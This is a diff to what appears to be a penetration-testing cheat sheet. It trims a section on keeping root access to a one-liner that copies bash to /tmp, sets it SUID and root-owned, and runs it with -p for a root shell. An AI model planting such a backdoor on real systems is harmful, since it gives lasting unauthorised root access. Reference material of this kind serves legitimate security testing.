@@ -209,22 +209,6 @@ Credit: Tib3rius
 ```bash
 # as root, create a copy of BASH and then set the SUID-bit
 # to resume root-access execute the new binary using -p
-# root must own the new binary so use chown if necessary
-cp /bin/bash /tmp/bash
-chown root /tmp/bash
-chmod u+s /tmp/bash
-chmod o+x
-/tmp/bash -p
-```
-
-```bash
-# same technique as above, but as a one-liner
 cp /bin/bash /tmp/bash; chown root /tmp/bash; chmod u+s /tmp/bash; chmod o+x /tmp/bash
-/tmp/bash -p
-```
-
-```bash
-# if you want to try the technique above albeit locally on a box you already own
-sudo cp /bin/bash /tmp/bash; sudo chmod +s /tmp/bash
 /tmp/bash -p
 ```
